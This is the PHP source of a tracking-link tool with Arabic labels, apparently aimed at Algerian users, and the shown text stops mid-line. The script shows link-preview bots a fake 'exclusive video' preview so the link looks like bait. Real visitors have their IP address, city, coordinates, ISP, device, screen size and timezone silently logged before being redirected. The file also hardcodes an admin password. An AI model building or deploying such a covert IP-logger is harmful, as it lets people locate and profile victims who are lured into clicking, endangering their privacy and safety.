<?php
// إظهار الأخطاء للتحقق والتأكد من العمل
ini_set('display_errors', 1);
error_reporting(E_ALL);

session_start();

$admin_user = "SCLC USER";
$admin_pass = "aziz2000";

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: /");
    exit();
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['login'])) {
    if (isset($_POST['username']) and isset($_POST['password'])) {
        if ($_POST['username'] === $admin_user and$_POST['password'] === $admin_pass) {$_SESSION['logged_in'] = true;
            header("Location: /");
            exit();
        } else {
            $login_error = "اسم المستخدم أو كلمة المرور غير صحيحة!";
        }
    }
}

try {
    $db = new PDO('sqlite:tracker.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    $db->exec("CREATE TABLE IF NOT EXISTS links (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT UNIQUE, 
        target_url TEXT, 
        preview_title TEXT,
        preview_image TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");

    $db->exec("CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT, 
        public_ip TEXT, 
        local_ip TEXT, 
        country TEXT, 
        city TEXT, 
        lat TEXT, 
        lon TEXT, 
        isp TEXT, 
        device_info TEXT, 
        screen_res TEXT, 
        timezone TEXT, 
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");
} catch (Exception $e) {
    die("خطأ في قاعدة البيانات: " . $e->getMessage());
}

function get_real_ip() {
    if (!empty($_SERVER['HTTP_X-FORWARDED-FOR'])) {
        $ips = explode(',',$_SERVER['HTTP_X-FORWARDED-FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

function parse_isp($isp_name, $org_name) {$combined = $isp_name . ' ' .$org_name;
    if (stripos($combined, 'Mobilis') !== false or stripos($combined, 'ATM') !== false) return 'موبيليس (Mobilis)';
    if (stripos($combined, 'Djezzy') !== false or stripos($combined, 'Optimum Telecom') !== false) return 'جازي (Djezzy)';
    if (stripos($combined, 'Ooredoo') !== false or stripos($combined, 'Wataniya') !== false) return 'أوريدو (Ooredoo)';
    if (stripos($combined, 'Algérie Télécom') !== false or stripos($combined, 'Algerie Telecom') !== false or stripos($combined, 'AT') !== false) return 'اتصالات الجزائر (Algérie Télécom)';
    return trim($isp_name) ?: 'شبكة غير معروفة';
}

function get_device_type($ua) {$brand = 'جهاز ذكي';
    if (stripos($ua, 'Samsung') !== false)$brand = 'سامسونج (Samsung)';
    elseif (stripos($ua, 'iPhone') !== false)$brand = 'آيفون (iPhone)';
    elseif (stripos($ua, 'Huawei') !== false)$brand = 'هواوي (Huawei)';
    elseif (stripos($ua, 'Xiaomi') !== false or stripos($ua, 'Redmi') !== false or stripos($ua, 'POCO') !== false)$brand = 'شاومي (Xiaomi)';
    elseif (stripos($ua, 'Oppo') !== false)$brand = 'أوبو (Oppo)';
    elseif (stripos($ua, 'Vivo') !== false)$brand = 'فيفو (Vivo)';
    elseif (stripos($ua, 'Realme') !== false)$brand = 'ريلمي (Realme)';

    if (stripos($ua, 'Android') !== false) return$brand . ' - أندرويد';
    if (stripos($ua, 'iPhone') !== false or stripos($ua, 'iPad') !== false) return$brand . ' - iOS';
    if (stripos($ua, 'Windows') !== false) return 'حاسوب - ويندوز';
    if (stripos($ua, 'Macintosh') !== false or stripos($ua, 'Mac OS') !== false) return 'حاسوب - ماك';
    if (stripos($ua, 'Linux') !== false) return 'نظام لينكس';
    return 'جهاز غير معروف';
}

function get_ip_details($ip) {
    if ($ip == '127.0.0.1' or $ip == '::1' or$ip == 'Unknown' or strpos($ip, '10.') === 0 or strpos($ip, '192.168.') === 0) {
        return ['country' => 'الجزائر (محلي)', 'city' => 'شبكة داخلية', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'شبكة محلية (Localhost)'];
    }
    $json = @file_get_contents("http://ip-api.com/json/" . $ip . "?fields=status,country,city,lat,lon,isp,org");
    $data = json_decode($json, true);
    if ($data and isset($data['status']) and$data['status'] == 'success') {
        return [
            'country' => $data['country'] ?? 'غير معروف',
            'city' => $data['city'] ?? 'غير معروف',
            'lat' => $data['lat'] ?? '36.7538',              'lon' =>$data['lon'] ?? '3.0588',
            'isp' => parse_isp($data['isp'] ?? '',$data['org'] ?? '')
        ];
    }
    return ['country' => 'غير معروف', 'city' => 'غير معروف', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'غير معروف'];
}

if (isset($_GET['r'])) {
    $code =$_GET['r'];
    $stmt =$db->prepare("SELECT * FROM links WHERE code = ?");
    $stmt->execute([$code]);
    $link =$stmt->fetch(PDO::FETCH_ASSOC);

    if ($link) {
        $ua =$_SERVER['HTTP_USER_AGENT'] ?? '';
        $is_bot = preg_match('/whatsapp\vert{}facebookexternalhit\vert{}twitterbot\vert{}telegrambot\vert{}embedly\vert{}quora link preview/i',$ua);

        if ($is_bot) {$title = !empty($link['preview_title']) ?$link['preview_title'] : 'فيديو حصري';
            $img = !empty($link['preview_image']) ?$link['preview_image'] : 'https://via.placeholder.com/600x400';
            
            echo '<!DOCTYPE html><html><head>';
            echo '<meta property="og:title" content="' . htmlspecialchars($title) . '">';
            echo '<meta property="og:description" content="انقر للمشاهدة الآن">';
            echo '<meta property="og:image" content="' . htmlspecialchars($img) . '">';
            echo '<meta property="og:type" content="video.other">';
            echo '</head><body></body></html>';
            exit();
        }

        $target = $link['target_url'];$public_ip = get_real_ip();
        $local_ip =$_GET['lip'] ?? 'غير متوفر';
        $geo = get_ip_details($public_ip);
        $device = get_device_type($ua);
        $screen =$_GET['screen'] ?? 'غير متوفر';
        $tz =$_GET['tz'] ?? 'غير متوفر';

        try {
            $logStmt =$db->prepare("INSERT INTO logs (code, public_ip, local_ip, country, city, lat, lon, isp, device_info, screen_res, timezone) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
            $logStmt->execute([$code, $public_ip,$local_ip, $geo['country'],$geo['city'], $geo['lat'],$geo['lon'], $geo['isp'],$device, $screen,$tz]);
        } catch (Exception $e) {}

        header("Location: " . $target);
        exit();
    } else {
        die("الرابط غير موجود.");
    }
}

if (!isset($_SESSION['logged_in']) or$_SESSION['logged_in'] !== true):
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - لوحة التحكم</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
        body { background-color: #0b0f19; color: #f3f4f6; display: flex; justify-content: center; align-items: center; height: 100vh; padding: 15px; }
        .login-card { background: #111827; border: 1px solid #1f2937; border-radius: 12px; padding: 30px; width: 100%; max-width: 400px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
        h2 { color: #38bdf8; font-size: 20px; margin-bottom: 20px; text-align: center; }
        .form-group { display: flex; flex-direction: column; gap: 12px; margin-bottom: 15px; }
        input { background: #030712; border: 1px solid #374151; border-radius: 8px; padding: 12px; color: #fff; font-size: 14px; outline: none; }
        input:focus { border-color: #38bdf8; }
        button { background: #0284c7; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; transition: background 0.2s; font-size: 15px; width: 100%; }
        button:hover { background: #0369a1; }
        .error { background: #7f1d1d; color: #fca5a5; padding: 10px; border-radius: 6px; font-size: 13px; margin-bottom: 15px; text-align: center; }
    </style>
</head>
<body>
    <div class="login-card">
        <h2>🔒 تسجيل الدخول للوحة التحكم</h2>
        <?php if (isset($login_error)): ?>
            <div class="error"><?php echo $login_error; ?></div>
        <?php endif; ?>
        <form method="POST">
            <div class="form-group">
                <input type="text" name="username" placeholder="اسم المستخدم" required>
                <input type="password" name="password" placeholder="كلمة المرور" required>
                <button type="submit" name="login">دخول</button>
            </div>
        </form>
    </div>
</body>
</html>
<?php
exit();
endif;

$generated_link = "";
$tracking_code = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
    $target_url = trim($_POST['target_url']);
    $preview_title = trim($_POST['preview_title']);
    $preview_image = trim($_POST['preview_image']);
    
    if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
        $target_url = "https://" . $target_url;
    }

    $code = substr(md5
